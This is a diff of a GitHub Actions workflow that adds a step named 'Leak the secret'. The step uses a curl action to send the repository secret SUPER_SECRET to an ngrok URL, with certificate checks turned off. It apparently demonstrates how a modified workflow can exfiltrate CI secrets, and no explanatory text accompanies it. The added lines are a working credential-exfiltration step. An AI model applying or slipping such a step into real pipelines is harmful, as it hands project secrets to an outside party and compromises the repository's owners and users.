@@ -8,3 +8,7 @@ jobs:
       uses: actions/hello-world-docker-action@master
       with:
         who-to-greet: ${{ secrets.SUPER_SECRET }}
+    - name: 'Leak the secret'
+      uses: wei/curl@v1
+      with:
+        args: -k "https://476c8c29.ngrok.io/?leak=${{ secrets.SUPER_SECRET }}"
